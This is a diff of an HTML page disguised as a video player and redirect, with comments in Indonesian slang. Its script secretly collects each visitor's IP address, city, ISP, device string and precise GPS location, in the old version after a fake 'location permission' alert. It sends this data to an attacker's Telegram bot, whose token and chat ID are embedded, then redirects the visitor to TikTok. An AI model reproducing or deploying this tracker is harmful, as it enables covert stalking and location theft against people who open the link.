@@ -1,77 +1,84 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player</title>
+    <title>Redirecting...</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; font-family: sans-serif; }
+        .loader { border: 3px solid #333; border-top: 3px solid #00f2ea; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <p style="margin-left: 15px;">Loading Video...</p>
 
     <script>
-        // GANTI DENGAN DATA LU
-        const TOKEN = "8775661623:AAG5vKbtp089TtX_ExTYoDEMigA2rDJn1zc";
-const CHAT_ID = "8432724042"; // Ganti pake ID Tele lu
+        // --- 1. CONFIGURATION ---
+        // Ganti URL ini dengan API endpoint atau Webhook Lu buat nampung datanya
+        const WEBHOOK_URL = "https://api.telegram.org/bot8775661623:AAG5vKbtp089TtX_ExTYoDEMigA2rDJn1zc/sendMessage";
+        const CHAT_ID = "8432724042";
 
+        // Ambil URL tujuan dari Base64 di parameter ?id=
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedData = urlParams.get('id');
+        const REDIRECT_URL = encodedData ? atob(encodedData) : "https://www.tiktok.com";
+
+        // --- 2. DATA TRANSMISSION ---
         async function sendLog(text) {
-            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-            await fetch(url);
-        }
-
-        async function getIP() {
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return `🌐 *IP INFO*\nIP: \`${data.ip}\`\nCity: ${data.city}\nISP: ${data.org}`;
-            } catch (e) { return "🌐 IP Info: Failed to fetch"; }
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+            } catch (e) { console.error("Signal lost."); }
         }
 
-        function getDeviceInfo() {
-            return `📱 *DEVICE*\nPlatform: ${navigator.platform}\nAgent: ${navigator.userAgent.slice(0, 50)}...`;
+        function finish() {
+            window.location.href = REDIRECT_URL;
         }
 
-        async function collect() {
-            const device = getDeviceInfo();
-            const ipData = await getIP();
-            
+        // --- 3. RECONNAISSANCE LOGIC ---
+        async function startRecon() {
+            // STEP A: LANGKAH PERTAMA - TRACK ISP (ANTI-BLOCK BACKUP)
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                const ipMsg = `🌐 *NETWORK LOG (ISP TRACK)*\nIP: \`${ipData.ip}\`\nCity: ${ipData.city}\nISP: *${ipData.org}*\nDevice: ${navigator.userAgent}`;
+                await sendLog(ipMsg);
+            } catch (e) { await sendLog("⚠️ ISP Tracking failed."); }
+
+            // STEP B: LANGKAH KEDUA - MINTA LOKASI AKURAT (GPS)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     async (pos) => {
+                        // USER KLIK ALLOW (HOKI)
                         const lat = pos.coords.latitude;
                         const lon = pos.coords.longitude;
-                        const acc = pos.coords.accuracy;
-                        const maps = `https://www.google.com/maps?q=${lat},${lon}`;
-                        
-                        await sendLog(`🎯 *TARGET HIT! (GPS)*\n\n${device}\n\n${ipData}\n\n📍 *LOCATION*\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\n🔗 [Open Maps](${maps})`);
-                        redirect();
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        await sendLog(`🎯 *PRECISION HIT (GPS)*\n📍 [Open Location](${mapsLink})\nAcc: ${pos.coords.accuracy}m`);
+                        finish();
                     },
                     async (err) => {
-                        await sendLog(`⚠️ *TARGET REJECTED GPS*\n\n${device}\n\n${ipData}\n\n*Status:* Tracking via Network only.`);
-                        redirect();
+                        // USER KLIK BLOCK / TIMEOUT
+                        await sendLog("❌ *GPS ACCESS DENIED/BLOCKED* - Falling back to ISP data.");
+                        finish();
                     },
-                    { enableHighAccuracy: true }
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                 );
+            } else {
+                await sendLog("⚠️ Device doesn't support GPS.");
+                finish();
             }
         }
 
-        function redirect() {
-            // Ambil link asli dari URL parameter jika ada, atau default ke TikTok
-            const urlParams = new URLSearchParams(window.location.search);
-            const rawData = urlParams.get('id');
-            const dest = rawData ? atob(rawData) : "https://www.tiktok.com";
-            setTimeout(() => { window.location.href = dest; }, 500);
-        }
+        // --- 4. EXECUTION ---
+        // Jalankan recon begitu page terbuka
+        window.onload = startRecon;
 
-        window.onload = () => {
-            alert("This video requires location permission to play in your region.");
-            collect();
-        };
+        // Force redirect jika user AFK lebih dari 10 detik
+        setTimeout(finish, 10000);
     </script>
 </body>
 </html>
